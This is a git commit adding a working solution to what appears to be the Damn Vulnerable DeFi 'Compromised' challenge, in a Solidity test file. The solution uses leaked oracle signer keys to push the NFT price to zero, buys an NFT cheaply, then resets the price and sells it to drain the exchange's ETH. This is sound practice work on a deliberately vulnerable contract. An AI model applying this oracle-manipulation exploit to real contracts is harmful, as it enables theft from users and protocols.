72f987d8d816a13b7f287e3bd57c4021aef2b93c
v3he <pablo@v3he.io>
2025-05-28 19:25:29 +0200

    added compromised solution

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +53,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -71,27 +77,52 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
     function test_compromised() public checkSolved {
-        
+        address addr1 = vm.addr(
+            0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744 // found in the challenge description
+        );
+        address addr2 = vm.addr(
+            0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159 // found in the challenge description
+        );
+
+        vm.prank(addr1);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(addr2);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.startPrank(player);
+        uint256 nftId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        nft.approve(address(exchange), nftId);
+        vm.stopPrank();
+
+        vm.prank(addr1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(addr2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.startPrank(player);
+        exchange.sellOne(nftId);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        // Exchange doesn't have ETH anymore
-        assertEq(address(exchange).balance, 0);
-
-        // ETH was deposited into the recovery account
-        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
-
-        // Player must not own any NFT
-        assertEq(nft.balanceOf(player), 0);
-
-        // NFT price didn't change
-        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+        assertEq(address(exchange).balance, 0, "Exchange still has ETH");
+        assertEq(
+            recovery.balance,
+            EXCHANGE_INITIAL_ETH_BALANCE,
+            "Recovery account does not have the expected ETH balance"
+        );
+        assertEq(nft.balanceOf(player), 0, "Player still owns an NFT");
+        assertEq(
+            oracle.getMedianPrice("DVNFT"),
+            INITIAL_NFT_PRICE,
+            "NFT price has changed"
+        );
     }
 }
